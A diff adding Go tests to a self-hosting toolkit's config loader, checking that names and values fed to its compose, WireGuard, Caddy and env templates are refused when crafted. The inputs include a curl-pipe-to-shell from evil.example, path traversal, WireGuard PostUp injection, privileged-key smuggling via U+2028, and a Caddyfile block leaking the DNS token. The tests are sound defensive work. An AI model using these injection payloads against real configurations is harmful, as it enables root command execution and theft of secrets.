@@ -788,3 +788,137 @@ func TestUnknownArchIsRefused(t *testing.T) {
 		}
 	}
 }
+
+// An app is rendered into a stack directory named for it, beside the
+// toolkit's own, so an app may not take a toolkit stack's name.
+func TestAnAppIsNeverNamedForAToolkitStack(t *testing.T) {
+	named := validConfig + `  infra:
+    blueprint: wikijs
+    hostname: wiki.example.org
+    placement: cluster
+`
+	if _, err := config.Load(write(t, named)); err == nil || !strings.Contains(err.Error(), "apps.infra: the name is the toolkit's infrastructure stack's") {
+		t.Errorf("an app named infra loaded, or was refused without saying why: %v", err)
+	}
+}
+
+// An app's name is its stack's directory and compose project, so it is one
+// lowercase word: a slash, a dot segment or a capital would put its files
+// somewhere else, or out of the review that reads every stack.
+func TestAnAppNameIsOneWord(t *testing.T) {
+	for _, name := range []string{"a/b", "..", "../x", ".", "Talk", "../../../etc/cron.d", "-x", "a.b"} {
+		named := validConfig + `  "` + name + `":
+    blueprint: wikijs
+    hostname: wiki.example.org
+    placement: cluster
+`
+		if _, err := config.Load(write(t, named)); err == nil || !strings.Contains(err.Error(), "is not an app name") {
+			t.Errorf("%q: loaded, or refused without saying why: %v", name, err)
+		}
+	}
+}
+
+// A site's name is written into compose files, shell scripts, HAProxy and
+// Patroni configuration, and a directory of `paisans render --out`, so it is
+// one lowercase word: anything else could add keys to a compose file, run a
+// command, or write outside the output directory.
+func TestASiteNameIsOneWord(t *testing.T) {
+	for _, name := range []string{`h\n    privileged: true`, `$(curl -s evil.example|sh)`, "..", ".", "a/b", "Home", "a b", "-x"} {
+		named := strings.Replace(validConfig, "sites:\n", "sites:\n  \""+name+"\":\n    roles: [witness]\n    address: 10.44.0.9\n    ssh:\n      host: w.local\n      user: ubuntu\n      keys: [alice]\n", 1)
+		if _, err := config.Load(write(t, named)); err == nil || !strings.Contains(err.Error(), "is not a site name") {
+			t.Errorf("%q: loaded, or refused without saying why: %v", name, err)
+		}
+	}
+}
+
+// The values the toolkit's own templates write as they are, into WireGuard,
+// Caddy and env files, are refused at load unless they are what they claim
+// to be: a WireGuard file with a line added runs it as root (PostUp), and a
+// Caddyfile or env file with one added routes or configures what nobody
+// reviewed.
+func TestValuesTheTemplatesWriteAsTheyAreAreChecked(t *testing.T) {
+	cases := []struct{ from, to, want string }{
+		{"    address: 10.44.0.1\n", "    address: 10.44.0.1\n    endpoint: \"evil\\nPostUp = touch /pwned:51820\"\n", "sites.home-a.endpoint"},
+		{"    address: 10.44.0.1\n", "    address: 10.44.0.1\n    endpoint: \"$(id).example.org:51820\"\n", "sites.home-a.endpoint"},
+		{"    address: 10.44.0.1\n", "    address: 10.44.0.1\n    public_address: \"203.0.113.1\\nPostUp = touch /pwned\"\n", "sites.home-a.public_address"},
+		{"    address: 10.44.0.1\n", "    address: 10.44.0.1\n    public_address6: \"2001:db8::1\\nPostUp = x\"\n", "sites.home-a.public_address6"},
+		{"  domain: example.org\n", "  domain: \"example.org\\n}\\nevil.example {\"\n", "community.domain"},
+		{"    hostname: talk.example.org\n", "    hostname: \"talk.example.org {\\n\"\n", "apps.talk.hostname"},
+		{"    hostname: talk.example.org\n", "    hostname: talk.example.org\n    hostnames:\n      media: \"m.example.org\\nX\"\n", "apps.talk.hostnames.media"},
+	}
+	for _, c := range cases {
+		doc := strings.Replace(validConfig, c.from, c.to, 1)
+		if doc == validConfig {
+			t.Fatalf("%q not in the fixture", c.from)
+		}
+		if _, err := config.Load(write(t, doc)); err == nil || !strings.Contains(err.Error(), c.want+":") {
+			t.Errorf("%s: loaded, or refused without naming it: %v", c.want, err)
+		}
+	}
+}
+
+// A YAML parser built on libyaml reads U+2028 and U+2029 as line breaks, so
+// an image reference carrying them adds keys to the compose file it is
+// written into: privileged, on the gateway's Caddy with the host's network.
+// An image reference is refused unless it is one.
+func TestAnImageReferenceIsOne(t *testing.T) {
+	const payload = "ghcr.io/pocket-id/pocket-id:v1.0.0     privileged: true     x-pad: a:v1.0.0"
+	cases := []struct{ from, to, want string }{
+		{"    placement: cluster\n", "    placement: cluster\n    images:\n      app: \"" + payload + "\"\n", "apps.talk.images.app"},
+		{"acme:\n  provider: desec\n", "acme:\n  provider: desec\n  image: \"" + payload + "\"\n", "acme.image"},
+		{"acme:\n  provider: desec\n", "acme:\n  provider: desec\n  image: \"ghcr.io/x/caddy:2 #\"\n", "acme.image"},
+	}
+	for _, c := range cases {
+		doc := strings.Replace(validConfig, c.from, c.to, 1)
+		if doc == validConfig {
+			t.Fatalf("%q not in the fixture", c.from)
+		}
+		if _, err := config.Load(write(t, doc)); err == nil || !strings.Contains(err.Error(), c.want) {
+			t.Errorf("%s: loaded, or refused without naming it: %v", c.want, err)
+		}
+	}
+	for _, r := range []rune{' ', ' '} {
+		if _, ok := config.ControlRune("a" + string(r) + "b"); !ok {
+			t.Errorf("U+%04X is not a control character to ControlRune", r)
+		}
+	}
+	// A track, which apply resolves, and a reference to one build pass.
+	for _, ref := range []string{"ghcr.io/example-org/mbin:v1.*.*-fork", "docker.io/library/postgres:18.*-trixie", "ghcr.io/x/y:1.2@sha256:" + strings.Repeat("a", 64), "caddy:2.10.0"} {
+		doc := strings.Replace(validConfig, "    placement: cluster\n", "    placement: cluster\n    images:\n      app: \""+ref+"\"\n", 1)
+		if _, err := config.Load(write(t, doc)); err != nil {
+			t.Errorf("%s: %v", ref, err)
+		}
+	}
+}
+
+// acme.provider is written into the Caddyfile's global options as it is, so
+// it is a provider's name and nothing more: a crafted one could close the
+// block and add a site that answers with the DNS token.
+func TestAnACMEProviderIsAName(t *testing.T) {
+	payload := `"desec {env.ACME_DNS_TOKEN}\n}\nevil.example {\n\trespond {env.ACME_DNS_TOKEN}\n}\n{\n\tacme_dns desec"`
+	doc := strings.Replace(validConfig, "  provider: desec\n", "  provider: "+payload+"\n", 1)
+	if _, err := config.Load(write(t, doc)); err == nil || !strings.Contains(err.Error(), "acme.provider:") {
+		t.Errorf("a crafted acme.provider loaded, or was refused without naming it: %v", err)
+	}
+}
+
+// A setting is written by a blueprint's templates into whatever format the
+// application reads (JSON, INI, env, YAML), so a control character in one,
+// a line break above all, could add a line to it. Each string setting, and
+// each string in a list or a mapping, is refused if it holds one; the
+// invite's code of conduct, written as a Markdown file of its own, may hold
+// line breaks and tabs.
+func TestASettingHoldsNoControlCharacter(t *testing.T) {
+	cases := []struct{ settings, want string }{
+		{"      site_name: \"Blog\\n[app]\\nopen_registration = true\"\n", "apps.talk.settings.site_name"},
+		{"      brand: \"x\\u2028y\"\n", "apps.talk.settings.brand"},
+		{"      groups: [members, \"a\\nKBIN_X=1\"]\n", "apps.talk.settings.groups"},
+		{"      nested: {a: \"b\\tc\"}\n", "apps.talk.settings.nested"},
+	}
+	for _, c := range cases {
+		doc := strings.Replace(validConfig, "    placement: cluster\n", "    placement: cluster\n    settings:\n"+c.settings, 1)
+		if _, err := config.Load(write(t, doc)); err == nil || !strings.Contains(err.Error(), c.want) {
+			t.Errorf("%s: loaded, or refused without naming it: %v", c.want, err)
+		}
+	}
+}
